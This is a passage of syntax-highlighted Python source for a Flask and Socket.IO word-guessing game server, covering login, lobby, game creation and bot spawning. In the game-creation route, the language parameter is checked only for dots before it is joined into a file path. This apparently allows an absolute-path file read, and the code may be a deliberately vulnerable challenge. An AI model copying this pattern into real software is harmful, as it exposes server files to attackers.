    <span class="n">profile</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span> <span class="sh">'</span><span class="s">password_hash</span><span class="sh">'</span><span class="p">:</span> <span class="n">pw_hash</span><span class="p">,</span> <span class="sh">'</span><span class="s">wins</span><span class="sh">'</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="sh">'</span><span class="s">is_bot</span><span class="sh">'</span><span class="p">:</span> <span class="n">is_bot</span><span class="p">}</span>
    <span class="nf">save_profile</span><span class="p">(</span><span class="n">profile</span><span class="p">)</span>
    <span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">username</span>
    <span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">is_bot</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">is_bot</span>
    <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">lobby</span><span class="sh">'</span><span class="p">))</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/login</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">:</span>
        <span class="k">if</span> <span class="sh">'</span><span class="s">username</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">session</span><span class="p">:</span>
            <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">lobby</span><span class="sh">'</span><span class="p">))</span>
        <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">login.html</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">,</span> <span class="sh">''</span><span class="p">).</span><span class="nf">strip</span><span class="p">()</span>
    <span class="n">raw_pass</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">password</span><span class="sh">'</span><span class="p">,</span> <span class="sh">''</span><span class="p">)</span>
    <span class="n">profile</span> <span class="o">=</span> <span class="nf">load_profile</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">profile</span><span class="p">:</span>
        <span class="nf">flash</span><span class="p">(</span><span class="sh">'</span><span class="s">Invalid username or password</span><span class="sh">'</span><span class="p">)</span>
        <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">login</span><span class="sh">'</span><span class="p">))</span>
    <span class="c1"># detect bot via secret prefix and strip
</span>    <span class="n">is_bot</span> <span class="o">=</span> <span class="bp">False</span>
    <span class="n">pwd</span> <span class="o">=</span> <span class="n">raw_pass</span>
    <span class="k">if</span> <span class="n">raw_pass</span><span class="p">.</span><span class="nf">startswith</span><span class="p">(</span><span class="n">BOT_SECRET_PREFIX</span><span class="p">):</span>
        <span class="n">is_bot</span> <span class="o">=</span> <span class="bp">True</span>
        <span class="n">pwd</span> <span class="o">=</span> <span class="n">raw_pass</span><span class="p">[</span><span class="nf">len</span><span class="p">(</span><span class="n">BOT_SECRET_PREFIX</span><span class="p">):]</span>
    <span class="c1"># verify password
</span>    <span class="k">if</span> <span class="ow">not</span> <span class="nf">check_password_hash</span><span class="p">(</span><span class="n">profile</span><span class="p">[</span><span class="sh">'</span><span class="s">password_hash</span><span class="sh">'</span><span class="p">],</span> <span class="n">pwd</span><span class="p">):</span>
        <span class="nf">flash</span><span class="p">(</span><span class="sh">'</span><span class="s">Invalid username or password</span><span class="sh">'</span><span class="p">)</span>
        <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">login</span><span class="sh">'</span><span class="p">))</span>
    <span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">username</span>
    <span class="c1"># preserve bot flag from profile or prefix
</span>    <span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">is_bot</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">profile</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">is_bot</span><span class="sh">'</span><span class="p">,</span> <span class="n">is_bot</span><span class="p">)</span>
    <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">lobby</span><span class="sh">'</span><span class="p">))</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/logout</span><span class="sh">'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">logout</span><span class="p">():</span>
    <span class="n">session</span><span class="p">.</span><span class="nf">pop</span><span class="p">(</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">,</span> <span class="bp">None</span><span class="p">)</span>
    <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">index</span><span class="sh">'</span><span class="p">))</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/lobby</span><span class="sh">'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">lobby</span><span class="p">():</span>
    <span class="k">if</span> <span class="sh">'</span><span class="s">username</span><span class="sh">'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">session</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">index</span><span class="sh">'</span><span class="p">))</span>
    
    <span class="n">profile</span> <span class="o">=</span> <span class="nf">load_profile</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">])</span>
    <span class="n">wins</span> <span class="o">=</span> <span class="n">profile</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">wins</span><span class="sh">'</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="k">if</span> <span class="n">profile</span> <span class="k">else</span> <span class="mi">0</span>
    <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">lobby.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">wins</span><span class="o">=</span><span class="n">wins</span><span class="p">,</span> <span class="n">languages</span><span class="o">=</span><span class="n">LANGUAGES</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/create_game</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">create_game</span><span class="p">():</span>
    <span class="k">if</span> <span class="sh">'</span><span class="s">username</span><span class="sh">'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">session</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">index</span><span class="sh">'</span><span class="p">))</span>
    <span class="c1"># generate unique code
</span>    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">code</span> <span class="o">=</span> <span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="nf">choices</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">ascii_uppercase</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span><span class="p">,</span> <span class="n">k</span><span class="o">=</span><span class="mi">6</span><span class="p">))</span>
        <span class="k">if</span> <span class="n">code</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">games</span><span class="p">:</span>
            <span class="k">break</span>
    <span class="c1"># prepare game with selected language word list
</span>    <span class="c1"># determine language (default to first available)
</span>    <span class="n">language</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">language</span><span class="sh">'</span><span class="p">,</span> <span class="bp">None</span><span class="p">)</span>

    <span class="k">if</span> <span class="ow">not</span> <span class="n">language</span> <span class="ow">or</span> <span class="sh">'</span><span class="s">.</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">language</span><span class="p">:</span>
        <span class="n">language</span> <span class="o">=</span> <span class="n">LANGUAGES</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="k">if</span> <span class="n">LANGUAGES</span> <span class="k">else</span> <span class="bp">None</span>
    
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] Using language </span><span class="si">{</span><span class="n">language</span><span class="si">}</span><span class="sh">"</span><span class="p">,</span> <span class="nb">file</span><span class="o">=</span><span class="n">sys</span><span class="p">.</span><span class="n">stderr</span><span class="p">)</span>
    <span class="c1"># load words for this language
</span>    <span class="n">word_list</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">if</span> <span class="n">language</span><span class="p">:</span>
        <span class="n">wl_path</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">WORDS_DIR</span><span class="p">,</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">language</span><span class="si">}</span><span class="s">.txt</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] Using path </span><span class="si">{</span><span class="n">wl_path</span><span class="si">}</span><span class="sh">"</span><span class="p">,</span> <span class="nb">file</span><span class="o">=</span><span class="n">sys</span><span class="p">.</span><span class="n">stderr</span><span class="p">)</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">wl_path</span><span class="p">)</span> <span class="k">as</span> <span class="n">wf</span><span class="p">:</span>
                <span class="n">word_list</span> <span class="o">=</span> <span class="p">[</span><span class="n">line</span><span class="p">.</span><span class="nf">strip</span><span class="p">()</span> <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">wf</span> <span class="k">if</span> <span class="n">line</span><span class="p">.</span><span class="nf">strip</span><span class="p">()]</span>
                <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Opened, wordlist:</span><span class="sh">"</span><span class="p">,</span> <span class="nb">file</span><span class="o">=</span><span class="n">sys</span><span class="p">.</span><span class="n">stderr</span><span class="p">)</span>
                <span class="nf">print</span><span class="p">(</span><span class="n">word_list</span><span class="p">,</span> <span class="nb">file</span><span class="o">=</span><span class="n">sys</span><span class="p">.</span><span class="n">stderr</span><span class="p">)</span>
        <span class="k">except</span> <span class="nb">IOError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="nf">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
            <span class="n">word_list</span> <span class="o">=</span> <span class="p">[]</span>
            <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Opened, wordlist:</span><span class="sh">"</span><span class="p">,</span> <span class="nb">file</span><span class="o">=</span><span class="n">sys</span><span class="p">.</span><span class="n">stderr</span><span class="p">)</span>
            <span class="nf">print</span><span class="p">(</span><span class="n">word_list</span><span class="p">,</span> <span class="nb">file</span><span class="o">=</span><span class="n">sys</span><span class="p">.</span><span class="n">stderr</span><span class="p">)</span>

    <span class="c1"># fallback if needed
</span>    <span class="k">if</span> <span class="ow">not</span> <span class="n">word_list</span><span class="p">:</span>
        <span class="n">word_list</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="c1"># pick 25 random words
</span>    <span class="n">words</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="nf">sample</span><span class="p">(</span><span class="n">word_list</span><span class="p">,</span> <span class="mi">25</span><span class="p">)</span> <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">word_list</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">25</span> <span class="k">else</span> <span class="n">random</span><span class="p">.</span><span class="nf">sample</span><span class="p">(</span><span class="n">word_list</span> <span class="o">*</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">25</span><span class="p">)</span>
    <span class="n">start_team</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="nf">choice</span><span class="p">([</span><span class="sh">'</span><span class="s">red</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">blue</span><span class="sh">'</span><span class="p">])</span>
    <span class="n">counts</span> <span class="o">=</span> <span class="p">{</span>
        <span class="sh">'</span><span class="s">red</span><span class="sh">'</span><span class="p">:</span> <span class="mi">9</span> <span class="k">if</span> <span class="n">start_team</span> <span class="o">==</span> <span class="sh">'</span><span class="s">red</span><span class="sh">'</span> <span class="k">else</span> <span class="mi">8</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">blue</span><span class="sh">'</span><span class="p">:</span> <span class="mi">9</span> <span class="k">if</span> <span class="n">start_team</span> <span class="o">==</span> <span class="sh">'</span><span class="s">blue</span><span class="sh">'</span> <span class="k">else</span> <span class="mi">8</span>
    <span class="p">}</span>
    <span class="c1"># assign colors by index to support duplicate words
</span>    <span class="n">indices</span> <span class="o">=</span> <span class="nf">list</span><span class="p">(</span><span class="nf">range</span><span class="p">(</span><span class="mi">25</span><span class="p">))</span>
    <span class="n">random</span><span class="p">.</span><span class="nf">shuffle</span><span class="p">(</span><span class="n">indices</span><span class="p">)</span>
    <span class="n">colors_list</span> <span class="o">=</span> <span class="p">[</span><span class="bp">None</span><span class="p">]</span> <span class="o">*</span> <span class="mi">25</span>
    <span class="c1"># one assassin
</span>    <span class="n">assassin_idx</span> <span class="o">=</span> <span class="n">indices</span><span class="p">.</span><span class="nf">pop</span><span class="p">()</span>
    <span class="n">colors_list</span><span class="p">[</span><span class="n">assassin_idx</span><span class="p">]</span> <span class="o">=</span> <span class="sh">'</span><span class="s">assassin</span><span class="sh">'</span>
    <span class="c1"># team words
</span>    <span class="k">for</span> <span class="n">team</span> <span class="ow">in</span> <span class="p">[</span><span class="sh">'</span><span class="s">red</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">blue</span><span class="sh">'</span><span class="p">]:</span>
        <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">counts</span><span class="p">[</span><span class="n">team</span><span class="p">]):</span>
            <span class="n">idx</span> <span class="o">=</span> <span class="n">indices</span><span class="p">.</span><span class="nf">pop</span><span class="p">()</span>
            <span class="n">colors_list</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">team</span>
    <span class="c1"># the rest are neutral
</span>    <span class="k">for</span> <span class="n">idx</span> <span class="ow">in</span> <span class="n">indices</span><span class="p">:</span>
        <span class="n">colors_list</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="sh">'</span><span class="s">neutral</span><span class="sh">'</span>
    <span class="c1"># determine hard mode (double win points)
</span>    <span class="n">hard_mode</span> <span class="o">=</span> <span class="nf">bool</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">hard_mode</span><span class="sh">'</span><span class="p">))</span>
    <span class="c1"># initialize game state
</span>    <span class="n">game</span> <span class="o">=</span> <span class="p">{</span>
        <span class="sh">'</span><span class="s">players</span><span class="sh">'</span><span class="p">:</span> <span class="p">[</span><span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]],</span>
        <span class="sh">'</span><span class="s">board</span><span class="sh">'</span><span class="p">:</span> <span class="n">words</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">colors</span><span class="sh">'</span><span class="p">:</span> <span class="n">colors_list</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">revealed</span><span class="sh">'</span><span class="p">:</span> <span class="p">[</span><span class="bp">False</span><span class="p">]</span> <span class="o">*</span> <span class="mi">25</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">start_team</span><span class="sh">'</span><span class="p">:</span> <span class="n">start_team</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">team_color</span><span class="sh">'</span><span class="p">:</span> <span class="n">start_team</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">clue_giver</span><span class="sh">'</span><span class="p">:</span> <span class="bp">None</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">clue</span><span class="sh">'</span><span class="p">:</span> <span class="bp">None</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">guesses_remaining</span><span class="sh">'</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">score</span><span class="sh">'</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">hard_mode</span><span class="sh">'</span><span class="p">:</span> <span class="n">hard_mode</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">bots</span><span class="sh">'</span><span class="p">:</span> <span class="p">[]</span>
    <span class="p">}</span>
    <span class="n">games</span><span class="p">[</span><span class="n">code</span><span class="p">]</span> <span class="o">=</span> <span class="n">game</span>
    <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">game_view</span><span class="sh">'</span><span class="p">,</span> <span class="n">code</span><span class="o">=</span><span class="n">code</span><span class="p">))</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/join_game</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">join_game</span><span class="p">():</span>
    <span class="k">if</span> <span class="sh">'</span><span class="s">username</span><span class="sh">'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">session</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">index</span><span class="sh">'</span><span class="p">))</span>
    <span class="n">code</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">code</span><span class="sh">'</span><span class="p">,</span> <span class="sh">''</span><span class="p">).</span><span class="nf">strip</span><span class="p">().</span><span class="nf">upper</span><span class="p">()</span>
    <span class="n">game</span> <span class="o">=</span> <span class="n">games</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">code</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">game</span> <span class="ow">or</span> <span class="nf">len</span><span class="p">(</span><span class="n">game</span><span class="p">[</span><span class="sh">'</span><span class="s">players</span><span class="sh">'</span><span class="p">])</span> <span class="o">&gt;=</span> <span class="mi">2</span><span class="p">:</span>
        <span class="nf">flash</span><span class="p">(</span><span class="sh">'</span><span class="s">Invalid or full game code</span><span class="sh">'</span><span class="p">)</span>
        <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">lobby</span><span class="sh">'</span><span class="p">))</span>
    <span class="k">if</span> <span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]</span> <span class="ow">in</span> <span class="n">game</span><span class="p">[</span><span class="sh">'</span><span class="s">players</span><span class="sh">'</span><span class="p">]:</span>
        <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">game_view</span><span class="sh">'</span><span class="p">,</span> <span class="n">code</span><span class="o">=</span><span class="n">code</span><span class="p">))</span>
    <span class="n">game</span><span class="p">[</span><span class="sh">'</span><span class="s">players</span><span class="sh">'</span><span class="p">].</span><span class="nf">append</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">])</span>
    <span class="c1"># assign the joiner as clue giver
</span>    <span class="n">game</span><span class="p">[</span><span class="sh">'</span><span class="s">clue_giver</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]</span>
    <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">game_view</span><span class="sh">'</span><span class="p">,</span> <span class="n">code</span><span class="o">=</span><span class="n">code</span><span class="p">))</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/game/&lt;code&gt;</span><span class="sh">'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">game_view</span><span class="p">(</span><span class="n">code</span><span class="p">):</span>
    <span class="k">if</span> <span class="sh">'</span><span class="s">username</span><span class="sh">'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">session</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">index</span><span class="sh">'</span><span class="p">))</span>
    <span class="n">game</span> <span class="o">=</span> <span class="n">games</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">code</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">game</span> <span class="ow">or</span> <span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">game</span><span class="p">[</span><span class="sh">'</span><span class="s">players</span><span class="sh">'</span><span class="p">]:</span>
        <span class="nf">flash</span><span class="p">(</span><span class="sh">'</span><span class="s">Invalid game access</span><span class="sh">'</span><span class="p">)</span>
        <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">lobby</span><span class="sh">'</span><span class="p">))</span>
    <span class="n">player_idx</span> <span class="o">=</span> <span class="n">game</span><span class="p">[</span><span class="sh">'</span><span class="s">players</span><span class="sh">'</span><span class="p">].</span><span class="nf">index</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">])</span>
    <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">game.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">code</span><span class="o">=</span><span class="n">code</span><span class="p">,</span> <span class="n">username</span><span class="o">=</span><span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">],</span> <span class="n">player_idx</span><span class="o">=</span><span class="n">player_idx</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/add_bot</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">add_bot</span><span class="p">():</span>
    <span class="k">if</span> <span class="sh">'</span><span class="s">username</span><span class="sh">'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">session</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">index</span><span class="sh">'</span><span class="p">))</span>
    <span class="n">code</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">code</span><span class="sh">'</span><span class="p">,</span> <span class="sh">''</span><span class="p">).</span><span class="nf">strip</span><span class="p">().</span><span class="nf">upper</span><span class="p">()</span>
    <span class="n">game</span> <span class="o">=</span> <span class="n">games</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">code</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">game</span> <span class="ow">or</span> <span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">game</span><span class="p">[</span><span class="sh">'</span><span class="s">players</span><span class="sh">'</span><span class="p">]:</span>
        <span class="nf">flash</span><span class="p">(</span><span class="sh">'</span><span class="s">Invalid game code</span><span class="sh">'</span><span class="p">)</span>
        <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">lobby</span><span class="sh">'</span><span class="p">))</span>
    <span class="c1"># spawn a bot process to join this game
</span>    <span class="kn">import</span> <span class="n">subprocess</span><span class="p">,</span> <span class="n">sys</span><span class="p">,</span> <span class="n">os</span> <span class="k">as</span> <span class="n">_os</span>
    <span class="n">script</span> <span class="o">=</span> <span class="n">_os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">_os</span><span class="p">.</span><span class="nf">getcwd</span><span class="p">(),</span> <span class="sh">'</span><span class="s">bot.py</span><span class="sh">'</span><span class="p">)</span>
    <span class="c1"># pass secret prefix to bot via environment
</span>    <span class="n">env</span> <span class="o">=</span> <span class="n">_os</span><span class="p">.</span><span class="n">environ</span><span class="p">.</span><span class="nf">copy</span><span class="p">()</span>
    <span class="n">env</span><span class="p">[</span><span class="sh">'</span><span class="s">BOT_SECRET_PREFIX</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">BOT_SECRET_PREFIX</span>
    
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">executable</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">script</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">code</span><span class="si">}</span><span class="sh">"</span><span class="p">,</span> <span class="nb">file</span><span class="o">=</span><span class="n">sys</span><span class="p">.</span><span class="n">stderr</span><span class="p">)</span>
    
    <span class="n">subprocess</span><span class="p">.</span><span class="nc">Popen</span><span class="p">([</span><span class="n">sys</span><span class="p">.</span><span class="n">executable</span><span class="p">,</span> <span class="n">script</span><span class="p">,</span> <span class="n">code</span><span class="p">],</span> <span class="n">env</span><span class="o">=</span><span class="n">env</span><span class="p">)</span>
    <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">game_view</span><span class="sh">'</span><span class="p">,</span> <span class="n">code</span><span class="o">=</span><span class="n">code</span><span class="p">))</span>

<span class="nd">@socketio.on</span><span class="p">(</span><span class="sh">'</span><span class="s">join</span><span class="sh">'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">on_join</span><span class="p">():</span>
    <span class="n">code</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">code</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">game</span> <span class="o">=</span> <span class="n">games</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">code</span><span class="p">)</span>
    <span class="n">username</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">game</span> <span class="ow">or</span> <span class="n">username</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">game</span><span class="p">[</span><span class="sh">'</span><span class="s">players</span><span class="sh">'</span><span class="p">]:</span>
        <span class="k">return</span>

    <span class="c1"># join the game room and record this client's socket id
</span>    <span class="nf">join_room</span><span class="p">(</span><span class="n">code</span><span class="p">)</span>
    <span class="c1"># map this player's username to their session id for personalized emits
</span>    <span class="n">game</span><span class="p">.</span><span class="nf">setdefault</span><span class="p">(</span><span class="sh">'</span><span class="s">sids</span><span class="sh">'</span><span class="p">,</span> <span class="p">{})[</span><span class="n">username</span><span class="p">]</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">sid</span>
    <span class="c1"># record bot participants
</span>    <span class="k">if</span> <span class="n">session</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">is_bot</span><span class="sh">'</span><span class="p">):</span>
        <span class="k">if</span> <span class="sh">'</span><span class="s">bots</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">game</span> <span class="ow">and</span> <span class="n">username</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">game</span><span class="p">[</span><span class="sh">'</span><span class="s">bots</span><span class="sh">'</span><span class="p">]:</span>
